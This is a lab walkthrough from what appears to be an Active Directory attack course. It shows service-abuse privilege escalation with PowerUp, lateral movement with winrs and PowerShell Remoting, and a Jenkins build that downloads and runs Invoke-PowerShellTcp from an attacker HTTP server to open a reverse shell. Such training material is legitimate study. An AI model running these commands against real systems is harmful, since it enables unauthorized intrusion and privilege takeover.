# 05 - Learning Objective

* Exploit a service on dcorp-studentx and elevate privileges to local administrator.
* Identify a machine in the domain where studentx has local administrative access.
* Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

We can use the **Powerup** from PowerSploit module (or WinPEAS) to check for any privilege escalation path:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
```

Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group:

<pre class="language-powershell"><code class="lang-powershell"><strong>Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
</strong>&#x3C;# Expected output
ServiceAbused Command
------------- -------
AbyssWebServer net localgroup Administrators dcorp\studentx /add
#>
</code></pre>

{% hint style="warning" %}
Remember to logoff and logon again to have local administrator privileges!
{% endhint %}

Identify a machine in the domain where studentx has local administrative access use **Find-PSRemotingLocalAdminAccess.ps1**:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

So, studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:

```powershell
winrs -r:dcorp-adminsrv cmd
set username
set computername
hostname
```

We can also use PowerShell Remoting:

```powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
$env:username
hostname
```

In Jenkins console we can add builds using Invoke-PowerShellTcp.ps1 reverse tcp shell hosted using hfs.exe:

<pre class="language-powershell"><code class="lang-powershell">#1 from attacker client
c:\AD\Tools\hfs.exe C:\AD\Tools\Invoke-PowerShellTcp.ps1
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
#Remember to add a firewall exception

#From Jenkis console
#Option1
<strong>powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
</strong>#Option2
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
$env:username
$env:computername
ipconfig
</code></pre>

